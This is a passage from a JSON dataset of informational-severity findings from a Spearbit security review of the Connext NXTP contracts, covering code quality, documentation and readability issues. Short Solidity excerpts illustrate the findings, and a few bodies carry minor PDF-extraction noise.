        "body": " When abi.encodeWithSignature is used the compiler does not check for mistakes in the signature or the types provided.  When abi.encodeWithSelector is used the compiler does not check for parameter type inconsistencies.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "setAggregators is missing checks against address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setAggregators does not check if tokenAddresses[i] or sources[i] is address(0).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "setAggregators can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setAggregators does not check if tokenAddresses length is equal to sources to revert early.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event is not emitted when an important action happens on-chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "No event is emitted when an important action happens on-chain.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add unit/fuzz tests to make sure edge cases would not cause an issue in Queue._length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "It is always assumed last + 1 >= first. It would be great to add unit/fuzz tests to check for this invariant. Adding these tests",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using prefix(...) instead of slice(0,...)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "tokenId() calls TypedMemView.slice() function to slice the first few bytes from _message: return _message.slice(0, TOKEN_ID_LEN, uint40(Types.TokenId)); TypedMemView.prefix() can also be used here since it achieves the same goal.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Elaborate TypedMemView encoding in comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView describes its encoding in comments as: // next 12 are memory address // next 12 are len // bottom 3 bytes are empty The comments can be elaborated to make them less ambiguous.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove Curve StableSwap paper URL",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "www.curve.fi/stableswap-paper.pdf The current working URL is curve.fi/files/stableswap-paper.pdf. to Curve StableSwap paper referenced in comments Link is no longer active:",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Validations in AmplificationUtils.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "1. If initialAPrecise=futureAPrecise then there will not be any ramping. 2. In stopRampA function, self.futureATime > block.timestamp can be revised to self.futureATime >= block.timestamp since once current timestamp has reached futureATime, futureAprice will be returned al- ways.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect PriceSource is returned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Price Source is returned incorrectly in case of stale prices as shown below 1. getTokenPrice function is called with _tokenAddress T1. 2. Assume the direct price is stale, so tokenPrice is set to 0. uint256 tokenPrice = assetPrices[tokenAddress].price; if (tokenPrice != 0 && ((block.timestamp - assetPrices[tokenAddress].updatedAt) <= VALID_PERIOD)) { return (tokenPrice, uint256(PriceSource.DIRECT)); } else { tokenPrice = 0; } 3. Now contract tries to retrieve price from oracle. In case the price is outdated, the returned price will again be 0 and source would be set to PriceSource.CHAINLINK. if (tokenPrice == 0) { tokenPrice = getPriceFromOracle(tokenAddress); source = PriceSource.CHAINLINK; } 128 4. Assuming v1PriceOracle is not yet set, contract will simply return the price and source which in this case is 0, PriceSource.CHAINLINK. In this case amount is correct but source is not correct. return (tokenPrice, uint256(source));",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "PriceSource.DEX is never used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The enum value DEX is never used in the contract and can be removed.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about handleOutgoingAsset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comment is incorrect as this function does not transfer funds to msg.sender. /** * @notice Handles transferring funds from the Connext contract to msg.sender. * @param _asset - The address of the ERC20 token to transfer. * @param _to - The recipient address that will receive the funds. * @param _amount - The amount to withdraw from contract. */ function handleOutgoingAsset( address _asset, address _to, uint256 _amount ) internal {",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "SafeMath is not required for Solidity 0.8.x",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Solidity 0.8.x has a built-in mechanism for dealing with overflows and underflows, so there is no need to use the SafeMath library",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use a deadline check modifier in ProposedOwnable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Any change in ownership through acceptProposedOwner() and renounceOwnership() has to go through a deadline check: // Ensure delay has elapsed if ((block.timestamp - _proposedOwnershipTimestamp) <= _delay) revert ProposedOwnable__acceptProposedOwner_delayNotElapsed(); This check can be extracted out in a modifier for readability.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use ExcessivelySafeCall in SpokeConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The low-level call code highlighted code above looks to be copied from ExcessivelySafeCall.sol. replacing this low-level call with the function call ExcessivelySafe- Consider",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "s.LIQUIDITY_FEE_NUMERATOR might change while a cross-chain transfer is in-flight.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "The constant expression for EMPTY_HASH can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "EMPTY_HASH is a constant with a value equal to: hex\"c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\", which is the keccak256 of an empty bytes. We can replace this constant hex literal with a more readable alternative.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify and add more documentation for getTokenPrice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "getTokenPrice can be simplified and it can try to return early whenever possible.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused code, files, interfaces, libraries, contracts, ...",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The codebase includes code, files, interfaces, libraries, and contracts that are no longer in use.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "_calculateSwapInv and _calculateSwap can mirror each other's calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "_calculateSwapInv could have mirrored the implementation of _calculateSwap uint256 y = xp[tokenIndexTo] - (dy * multipliers[tokenIndexTo]); uint256 x = getY(_getAPrecise(self), tokenIndexTo, tokenIndexFrom, y, xp); Or the other way around _calculateSwap mirror _calculateSwapInv and pick whatever is cheaper.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document that the virtual price of a stable swap pool might not be constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The virtual price of the LP token is not constant when the amplification coefficient is ramping even when/if token balances stay the same.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the reason for picking d is the starting point for calculating getYD using the Newton's method.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "d the stable swap invariant passed to getYD as a parameter and it is used as the starting point of the Newton method to find a root. This root is the value/price for the tokenIndex token that would stabilize the pool so that it would statisfy the stable swap invariant equation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the max allowed tokens in stable swap pools used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Based on the uint8 type for the indexes of tokens in different stable swap pools, it is inferred that the max possible number of tokens that can exist in a pool is 256. There is the following check when initializing internal pools: if (_pooledTokens.length <= 1 || _pooledTokens.length > 32) revert SwapAdminFacet__initializeSwap_invalidPooledTokens(); This means the internal pools can only have number of pooled tokens in 2, (cid:1) (cid:1) (cid:1) , 32.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename adoptedToLocalPools to better indicate what it represents",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "adoptedToLocalPools is used to keep track of external pools where one can swap between different variations of a token. But one might confuse this mapping as holding internal stable swap pools.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the usage of commented mysterious numbers in AppStorage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Before each struct AppStorage's field definition there is a line comment consisting of only digits // xx One would guess they might be relative slot indexes in the storage (relative to AppStorage's slot). But the numbers are not consistent.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "RouterPermissionsManagerInfo can be packed differently for readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "RouterPermissionsManagerInfo has multiple fields that are each a mapping of address to a differ- ent value. The address here represents a liquidity router address. It would be more readable to pack these values such that only one mapping is used. This would also indicate how all these mapping have the same shared key which is the router.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consolidate TokenId struct into a file that can be imported in relevant files",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TokenId struct is defined both in BridgeMessage and LibConnextStorage with the same struc- ture/fields. If in future, one would need to update one struct the other one should also be updated in parallel.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos, grammatical and styling errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "There are a few typos and grammatical mistakes that can be corrected in the codebase.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Keep consistent return parameters in calculateSwapToLocalAssetIfNeeded",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "All return paths in calculateSwapToLocalAssetIfNeeded except one return _local as the 2nd return parameter. It would be best for readability and consistency change the following code to follow the same pattern if (_asset == _local) { return (_amount, _asset); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix/add or complete missing NatSpec comments.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Some NatSpec comments are either missing or are incomplete.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define and use constants for different literals used in the codebase.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Throughout the project, a few literals have been used. It would be best to define a named constant for those. That way it would be more clear the purpose of those values used and also the common literals can be consolidated into one place.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Enforce using adopted for the returned parameter in swapFromLocalAssetIfNeeded... for consis- tency.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The other return paths in swapFromLocalAssetIfNeeded, swapFromLocalAssetIfNeededForEx- actOut and calculateSwapFromLocalAssetIfNeeded use the adopted parameter as one of the return value com- ponents. It would be best to have all the return paths do the same thing. Note swapFromLocalAssetIfNeeded and calculateSwapFromLocalAssetIfNeeded should always return (_, adopted) and swapFromLocalAssetIfNeededForExactOut should always return (_, _, adopted).",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use interface types for parameters instead of casting to the interface type multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Sometimes casting to the interface type has been performed multiple times. It will be cleaner if the parameter is defined as having that interface and avoid unnecessary casts.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Be aware of tokens with multiple addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "If a token has multiple addresses (see weird erc20) then the token cap might have an unexpected effect, especially if the two addresses have a different cap. function _addLiquidityForRouter(...) ... { ... if (s.domain == canonical.domain) { // Sanity check: caps not reached uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); } } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove old references to claims",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The contract RelayerFacet still has some references to claims. These are a residue from a previous version and are not used currently. error RelayerFacet__initiateClaim_emptyClaim(); error RelayerFacet__initiateClaim_notRelayer(bytes32 transferId); event InitiatedClaim(uint32 indexed domain, address indexed recipient, address caller, bytes32[] transferIds); ,! event Claimed(address indexed recipient, uint256 total, bytes32[] transferIds);",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck references to Nomad",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The code refers to nomad several times in a way that is currently not accurate. This could be confusing to the maintainers and readers of the code. This includes the following examples: BridgeFacet.sol:419: * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using the nomad ,! BridgeFacet.sol:423: * assets will be swapped for their local nomad asset counterparts (i.e. bridgeable tokens) via the configured AMM if swap is needed. The local tokens will * necessary. In the event that the adopted assets *are* local nomad assets, no ,! BridgeFacet.sol:424: ,! InboxFacet.sol:87: RoutersFacet.sol:533: AssetLogic.sol:102: asset. ,! AssetLogic.sol:139: swap ,! AssetLogic.sol:185: swap ,! AssetLogic.sol:336: adopted asset ,! AssetLogic.sol:375: * @notice Only accept messages from an Nomad Replica contract. * @param _local - The address of the nomad representation of the asset * @notice Swaps an adopted asset to the local (representation or canonical) nomad * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Swaps a local nomad asset for the adopted asset using the stored stable * @notice Calculate amount of tokens you receive on a local nomad asset for the * @notice Calculate amount of tokens you receive of a local nomad asset for the adopted asset ,! LibConnextStorage.sol:54: * @param receiveLocal - If true, will use the local nomad asset on the destination instead of adopted. ,! LibConnextStorage.sol:148: madUSDC on polygon). ,! LibConnextStorage.sol:204: LibConnextStorage.sol:268: madUSDC on polygon) * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> * this domain (the nomad local asset). * @dev Swaps for an adopted asset <> nomad local asset (i.e. POS USDC <> ,! ConnectorManager.sol:11: * @dev Each nomad router contract has a `XappConnectionClient`, which ,! references a 142",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document usage of Nomad domain schema",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The library LibConnextStorage specifies that the domains are compatible with the nomad domain schema. However other locations don't mention this. This is especially important during the enrollment of new domains. * @param originDomain - The originating domain (i.e. where `xcall` is called). Must match nomad domain schema ,! * @param destinationDomain - The final domain (i.e. where `execute` / `reconcile` are called). Must match nomad domain schema ,! struct TransferInfo { uint32 originDomain; uint32 destinationDomain; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Router has multiple meanings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The term router is used for three different concepts. This is confusing for maintainers and readers of the code: A) The router that provides Liquidity and signs bids * `router` - this is the address that will sign bids sent to the sequencer B) The router that can add new routers of type A (B is a role and the address could be a multisig) /// @notice Enum representing address role enum Role { None, Router, Watcher, Admin } C) The router that what previously was BridgeRouter or xApp Router: * @param _router The address of the potential remote xApp Router",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Robustness of receiving contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the _reconciled branch of the code, the functions _handleExecuteTransaction(), _execute- Calldata() and excessivelySafeCall() don't revert when the underlying call reverts This seems to be inten- tional. This underlying revert can happen if there is a bug in the underlying call or if insufficient gas is supplied by the relayer. Note: if a delegate address is specified it can retry the call to try and fix temporary issues. The receiving contract already has received the tokens via handleOutgoingAsset() so must be prepared to handle these tokens. This should be explicitly documented. function _handleExecuteTransaction(...) ... { AssetLogic.handleOutgoingAsset(_asset, _args.params.to, _amountOut); _executeCalldata(_transferId, _amountOut, _asset, _reconciled, _args.params); ... } function _executeCalldata(...) ... { if (_reconciled) { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(...); } else { ... } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions can be combined",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both xcall and xcallIntoLocal have same code except receiveLocal (which is set false for xcall and true for xcallIntoLocal) value. Instead of having these as separate function, a single function can be created which can tweak the functionalities of xcall and xcallIntoLocal on basis of receiveLocal value",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document source of zeroHashes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The hashes which are used in function zeroHashes() are not explained, which makes it more difficult to understand and verify the code. function zeroHashes() internal pure returns (bytes32[TREE_DEPTH] memory _zeroes) { ... // keccak256 zero hashes bytes32 internal constant Z_0 = hex\"0000000000000000000000000000000000000000000000000000000000000000\"; ... bytes32 internal constant Z_31 = hex\"8448818bb4ae4562849e949e17ac16e0be16688e156b5cf15e098c627c0056a9\"; ,! ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document underflow/overflows in TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function index() has an overflow when _bytes derflow when _len == 0. These two compensate each other so the end result of index() is as expected. As the special case for _bytes == 0 is also handled, we assume this is intentional. However this behavior isn't mentioned in the comments, while other underflow/overflows are documented. library TypedMemView { function index( bytes29 memView, uint256 _index, uint8 _bytes ) internal pure returns (bytes32 result) { ... unchecked { uint8 bitLength = _bytes * 8; } ... } function leftMask(uint8 _len) private pure returns (uint256 mask) { ... mask := sar( sub(_len, 1), ... ... ) } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use while loops in dequeueVerified()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Within function dequeueVerified() there are a few for loops that mention a variable as there first element. This is a null statement and can be removed. After removing, only a while condition remains. Replacing the for with a while would make the code more readable. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { ... } ... for (first; first <= last; ) { ... } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Duplicate functions in Encoding.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Encoding.sol defines a few functions already present in TypedMemView.sol: nibbleHex(), byte- Hex(), encodeHex().",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document about two MerkleTreeManager's",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "On the hub domain (e.g. mainnet) there are two MerkleTreeManagers, one for the hub and one for the MainnetSpokeConnector. This might not be obvious to the casual readers of the code. Accidentally confusing the two would lead to weird issues.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Match filename to contract name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Sometimes the name of the .sol file is different than the contract name. Also sometimes multiple contracts are defined in the same file. Additionally there are multiple .sol files with the same name. This makes it more difficult to find the file containing the contract. File: messaging/Merkle.sol contract MerkleTreeManager is ProposedOwnableUpgradeable { ... } File: messaging/libraries/Merkle.sol library MerkleLib { ... } File: ProposedOwnable.sol abstract contract ProposedOwnable is IProposedOwnable { ... } abstract contract ProposedOwnableUpgradeable is Initializable, ProposedOwnable { ... } File: OZERC20.sol 148 contract ERC20 is IERC20, IERC20Permit, EIP712 { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use uint40 for type in TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "All internal functions in TypedMemView use uint40 for type except build(). Since internal functions can be called by inheriting contracts, it's better to provide a consistent interface.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment in function typeOf() is inaccurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A comment in function typeOf() is inaccurate. It says it is shifting 24 bytes, however it is shifting 216 / 8 = 27 bytes. function typeOf(bytes29 memView) internal pure returns (uint40 _type) { assembly { ... // 216 == 256 - 40 _type := shr(216, memView) // shift out lower 24 bytes } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Natspec documentation in TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "unsafeJoin()'s Natspec documentation is incomplete as the second argument to function is not documented.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove irrelevant comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": " Instance 1 - TypedMemView.sol#L770 clone() has this comment that seems to be copied from equal(). This is not applicable to clone() and can be deleted. * @dev Shortcuts if the pointers are identical, otherwise compares type and digest.  Instance 2 - SpokeConnector.sol#L499 The function process of SpokeConnector contains comments that are no longer relevant. // check re-entrancy guard // require(entered == 1, \"!reentrant\"); // entered = 0; Instance 3 - BridgeFacet.sol#L419 Nomad is no longer used within Connext. However, they are still being mentioned in the comments within the codebase. * @notice Initiates a cross-chain transfer of funds, calldata, and/or various named properties using ,! the nomad * network.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about TypedMemView encoding",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A TypedMemView variable of type bytes29 is encoded as follows:  First 5 bytes encode a type flag.  Next 12 bytes point to a memory address.  Next 12 bytes encode the length of the memory view (in bytes).  Next 3 bytes are empty. When shifting a TypedMemView variable to the right by 15 bytes (120 bits), the encoded length and the empty bytes are removed. Hence, this comment is incorrect: // 120 bits = 12 bytes (the encoded loc) + 3 bytes (empty low space) _loc := and(shr(120, memView), _mask)",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Constants can be used in assembly blocks directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. Highlighted code above have the following pattern: uint256 _mask = LOW_12_MASK; // assembly can't use globals assembly { // solium-disable-previous-line no-inline-assembly _len := and(shr(24, memView), _mask) } Here, LOW_12_MASK is a constant which can be used directly in assembly code.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document source of processMessageFromRoot()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function processMessageFromRoot() of ArbitrumHubConnector doesn't contain a comment where it is derived from. Most other functions have a link to the source. Linking to the source would make the function easier to verify and maintain.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Be aware of zombies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _validateSendRoot() of ArbitrumHubConnector check that stakerCount and child- StakerCount are larger than 0. The definition of stakerCount and childStakerCount document that they could include zombies. Its not immediately clear what zombies are, but it might be relevant to consider them. contract ArbitrumHubConnector is HubConnector { function _validateSendRoot(...) ... { ... require(node.stakerCount > 0 && node.childStakerCount > 0, \"!staked\"); } } // Number of stakers staked on this node. This includes real stakers and zombies uint64 stakerCount; // Number of stakers staked on a child node. This includes real stakers and zombies uint64 childStakerCount;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Readability of proveAndProcess()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function proveAndProcess() is relatively difficult to understand because it first processes for the case of i==0 and then does a loop over i==1..._proofs.length. function proveAndProcess(...) ... { ... bytes32 _messageHash = keccak256(_proofs[0].message); bytes32 _messageRoot = calculateMessageRoot(_messageHash, _proofs[0].path, _proofs[0].index); proveMessageRoot(_messageRoot, _aggregateRoot, _aggregatePath, _aggregateIndex); messages[_messageHash] = MessageStatus.Proven; for (uint32 i = 1; i < _proofs.length; ) { _messageHash = keccak256(_proofs[i].message); bytes32 _calculatedRoot = calculateMessageRoot(_messageHash, _proofs[i].path, _proofs[i].index); require(_calculatedRoot == _messageRoot, \"!sharedRoot\"); messages[_messageHash] = MessageStatus.Proven; unchecked { ++i; } } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Readability of checker()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
